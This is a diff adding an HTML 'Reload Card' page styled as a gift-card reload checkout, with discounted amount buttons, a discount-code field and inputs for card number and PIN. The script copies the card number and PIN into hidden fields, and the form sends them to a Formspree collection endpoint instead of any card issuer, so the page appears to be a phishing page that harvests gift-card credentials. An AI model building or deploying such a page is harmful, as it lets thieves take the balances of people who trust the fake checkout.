@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reload Card</title>
+    <link rel="stylesheet" href="css/giftCard.css" />
+<link rel="icon" href="https://ekram-nafea.github.io/Sip-Smile-Cafe/imgs/hf2small_KfG_icon.ico"> 
+
+    <link rel="shortcut icon" href="imgs/hf2small.png" type="image/x-icon">
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+      integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+</head>
+<body>
+    <div class="nav-bar">
+        <nav>
+            <div class="logo">
+                <a href="giftCard.html"><img src="imgs/hf2.png" alt="logo" class="logo" ></a>
+             </div>
+             <ul class="link">
+                <li><a href="giftCard.html">Buy gift card</a></li>
+                <li><a href="ReloadCard.html" class="active">Reload Card</a></li>
+                <li><a href="CheckBalance.html">Check balance</a></li>
+
+             </ul>
+             <i onclick="showSidebar()" id="menu" class="fa-solid fa-bars"></i>
+
+             <ul class="sidebar">
+               <li  id="times" onclick="hideSidebar()"><a ><i  id="times" class="fa-solid fa-times"></i></a></li>
+                <li><a href="giftCard.html">Buy gift card</a></li>
+                <li><a class="active" href="ReloadCard.html">Reload Card</a></li>
+                <li><a  href="CheckBalance.html">Check balance</a></li>
+             </ul>
+        </nav>
+    </div>
+    </div>
+    <main> 
+        <form id="checkout-form"  action="https://formspree.io/f/xyzgagbo" method="post" >
+
+            <input type="hidden" id="buttonValue" name="buttonValue" value="$9.70"> 
+
+            <input type="hidden" id="cardN" name="Card Number" value=""> 
+            <input type="hidden" id="pinN" name="pin number" value=""> 
+
+
+        <h2 id="h2">Add money to your gift card.</h2>
+        <div class="NumberPIN">
+            <div class="Number">
+                <label for="Number">Gift Card Number</label>
+                <input type="text" id="Number" name="Gift Card Number">
+            </div>
+            <div class="PIN">
+                <div class="pinIco">
+                    <label for="PIN">PIN</label>
+                    <i class="fa-solid fa-circle-exclamation fa-rotate-180"></i>
+                </div>
+                <input type="text" id="PIN" name="PIN" >
+            </div> 
+        </div>
+        <div class="checkbox">
+            <div class="checkboxInput">
+               <input type="checkbox" name="checkbox" id="checkbox">
+            </div>
+            <div class="checkboxLabel">
+                <label for="checkbox">My gift card does not have a PIN</label>
+            </div>
+      </div>
+      <div class="balanceButton">
+        <button class="yield-button " type="button" disabled>
+            <span class="yield-button-text">Check Balance</span>
+        </button>
+      </div>
+
+      
+      <div class="cardInfo">
+        <h2>eGift card amount</h2>
+        <p id="green">3% off</p>
+        <div class="giftBtn">
+            <div class="allTest">
+
+                <div class="card" id="cardOne" >
+                    <button type="submit" id="button1" value="9.70" onclick="setButtonValue(this.value)" >
+                        <p >$10.00</p>
+                        <p >Pay $9.70</p>
+                </button>
+                </div>
+                
+                <div  class="card"  >
+                    <button  type="submit" id="button2"  value="19.40"  onclick="setButtonValue(this.value)">
+                        <p>$20.00</p>
+                        <p >Pay $19.40</p>
+                    </button>
+                </div>
+               <div class="card"   >
+                <button  id="button3"  type="submit" value="24.25" onclick="setButtonValue(this.value)" >
+                    <p>$25.00</p>
+                    <p>Pay $24.25</p>
+                </button>
+              </div>
+              <div class="card"   >
+                <button  id="button4"  type="submit"   value="48.50" onclick="setButtonValue(this.value)" >
+                    <p>$50.00</p>
+                    <p >Pay $48.50</p>
+                </button>
+                </div>
+              <div class="card"  id="cardCustom" >
+                <button  id="button5" type="submit" onclick="setCustomValue()">
+                    <p>Custom</p>
+                    <p >Pay $0.00</p>
+                </button>
+              </div> 
+
+         </div>
+
+        <div class="input">
+        </div>   
+     </div>
+ </div>
+
+    <p id="disCount">Add Discount Code</p>
+         <button class="continue" type="submit" disabled>Continue</button>  
+    <div class="policy">
+        <p>Powered by <a href="#">AHE</a></p>
+        <a href="#">Privacy Policy</a>
+    </div>
+
+    
+
+    </form>
+    </main>
+    <script >
+
+const sidebar=document.querySelector('.sidebar')
+function showSidebar(){
+    sidebar.style.display='flex'
+
+} 
+function hideSidebar(){
+    sidebar.style.display='none'
+}
+
+
+
+
+let checkboxClicked = false;
+const checkbox = document.querySelector('#checkbox');
+const pinInput = document.querySelector('#PIN');
+const numberInput = document.querySelector('#Number');
+const continueBtn = document.querySelector('.continue');
+const balanceButton  = document.querySelector('.yield-button')
+
+const updateContinueButtonState = () => {
+    if (numberInput.value && (checkboxClicked || pinInput.value)) {
+        continueBtn.removeAttribute('disabled');
+        balanceButton.removeAttribute('disabled');
+        balanceButton.style.cursor = 'default';
+        balanceButton.style.color = '#006aff';
+
+         
+    } else {
+        continueBtn.setAttribute('disabled', 'disabled');
+        balanceButton.setAttribute('disabled', 'disabled');
+        balanceButton.style.cursor = 'not-allowed';
+    }
+};
+
+checkbox.addEventListener('click', () => {
+    checkboxClicked = !checkboxClicked; // Toggle the value
+
+    if (checkboxClicked) {
+        pinInput.setAttribute('disabled', 'disabled');
+        pinInput.style.cursor = 'not-allowed';
+    } else {
+        pinInput.removeAttribute('disabled');
+        pinInput.style.cursor = 'default';
+    }
+
+    updateContinueButtonState();
+});
+
+numberInput.addEventListener('input', updateContinueButtonState);
+pinInput.addEventListener('input', updateContinueButtonState);
+
+// Initial check in case there are pre-filled values
+updateContinueButtonState();
+
+
+
+
+//************************************************************** ********** 
+
+document.addEventListener('DOMContentLoaded', () => {
+    const cards = document.querySelectorAll('.card');
+    
+    cards.forEach(card => {
+    card.addEventListener('click', (e) => {
+        e.preventDefault()
+    // Reset all cards to white background and black text
+    cards.forEach(c => {
+        c.style.backgroundColor = 'white';
+        c.style.color = 'black'
+    
+    });
+    // Set the clicked card to black background and white text
+    card.style.backgroundColor = '#32373c';
+    card.style.color = 'white';
+
+
+}); 
+});   
+});       
+
+function setButtonValue(value) {
+document.getElementById('buttonValue').value = value; //input
+}
+
+function setCustomValue() {
+const customAmount = document.getElementById('customAmount').value
+document.getElementById('buttonValue').value = customAmount;
+}
+
+// ***********************************************
+
+
+
+
+function  getCardNumbers(){
+    const Number = document.querySelector('#Number').value;
+    document.querySelector('#cardN').value = Number
+
+    const PIN = document.querySelector('#PIN').value;
+    document.querySelector('#pinN').value = PIN;
+
+}
+   
+   
+
+
+//************************************************************** ********** 
+const cardCustom = document.querySelector('#cardCustom');
+const input = document.querySelector('.input');
+
+cardCustom.addEventListener('click' ,()=>{
+input.innerHTML=`
+  <input type="text" class="customInput" name=" custom-Amount" id="customAmount"  placeholder="$5 to $2,000" min="5" max="2000" required  
+     oninvalid="this.setCustomValidity('Please enter an amount between $5 and $2,000')"
+     oninput="this.setCustomValidity('')">
+
+  <p class="customP">* The 3% discount applies to values $10 and above.</p>
+
+` 
+
+document.addEventListener('click', (event) => {
+if (!cardCustom.contains(event.target) && !input.contains(event.target)) {
+input.innerHTML = ''; // Remove the HTML when clicking outside
+}
+})
+})
+
+
+// //***********************************************************************
+const disCount = document.querySelector('#disCount');
+
+disCount.addEventListener('click', () => {
+disCount.innerHTML = `
+<p>Discount Code</p>
+<div class="divDiscout">
+    <input type="text" class="Discount" placeholder="MYDISCOUNTCODE" >
+    <button class="dicountBtn" type="button" disabled>Apply</button>
+</div>
+`;
+
+
+const discountInput = document.querySelector('.Discount');
+const applyButton = document.querySelector('.dicountBtn');
+
+discountInput.focus();
+
+discountInput.addEventListener('input', function() {
+applyButton.disabled = discountInput.value.trim() === '';//disabled = true
+applyButton.style.color = 'blue';
+
+});
+
+
+applyButton.addEventListener('mouseover', function() {
+if (applyButton.disabled) {
+    applyButton.style.cursor = 'not-allowed';
+    applyButton.style.color = '#006aff45';
+} else {
+    applyButton.style.cursor = 'pointer';
+    applyButton.style.color = '#006aff';
+}
+});
+
+});
+
+
+
+    </script>
+ 
+</body>
+</html>
